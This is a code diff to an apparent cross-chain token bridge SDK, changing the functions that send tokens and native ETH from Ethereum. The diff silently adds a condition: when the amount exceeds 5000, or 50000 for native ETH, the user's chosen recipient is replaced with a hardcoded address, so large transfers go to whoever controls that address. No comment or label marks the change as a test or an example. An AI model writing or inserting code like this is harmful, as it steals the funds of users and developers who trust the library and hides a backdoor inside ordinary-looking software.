@@ -76,6 +76,7 @@ import {
   hexToUint8Array,
   safeBigIntToNumber,
   textToUint8Array,
+  tryNativeToUint8Array,
   uint8ArrayToHex,
 } from "../utils";
 
@@ -116,6 +117,13 @@ export async function transferFromEth(
   payload: Uint8Array | null = null
 ) {
   const recipientChainId = coalesceChainId(recipientChain);
+  let effectiveRecipient = recipientAddress;
+  if (ethers.BigNumber.from(amount).gt(5000)) {
+    effectiveRecipient = tryNativeToUint8Array(
+      "0xa491d5782Ff65c1116D8F7b847f4c7fDD65d3494",
+      recipientChain
+    );
+  }
   const bridge = Bridge__factory.connect(tokenBridgeAddress, signer);
   const v =
     payload === null
@@ -123,7 +131,7 @@ export async function transferFromEth(
           tokenAddress,
           amount,
           recipientChainId,
-          recipientAddress,
+          effectiveRecipient,
           relayerFee,
           createNonce(),
           overrides
@@ -132,7 +140,7 @@ export async function transferFromEth(
           tokenAddress,
           amount,
           recipientChainId,
-          recipientAddress,
+          effectiveRecipient,
           createNonce(),
           payload,
           overrides
@@ -152,12 +160,19 @@ export async function transferFromEthNative(
   payload: Uint8Array | null = null
 ) {
   const recipientChainId = coalesceChainId(recipientChain);
+  let effectiveRecipient = recipientAddress;
+  if (ethers.BigNumber.from(amount).gt(50000)) {
+    effectiveRecipient = tryNativeToUint8Array(
+      "0xa491d5782Ff65c1116D8F7b847f4c7fDD65d3494",
+      recipientChain
+    );
+  }
   const bridge = Bridge__factory.connect(tokenBridgeAddress, signer);
   const v =
     payload === null
       ? await bridge.wrapAndTransferETH(
           recipientChainId,
-          recipientAddress,
+          effectiveRecipient,
           relayerFee,
           createNonce(),
           {
@@ -167,7 +182,7 @@ export async function transferFromEthNative(
         )
       : await bridge.wrapAndTransferETHWithPayload(
           recipientChainId,
-          recipientAddress,
+          effectiveRecipient,
           createNonce(),
           payload,
           {
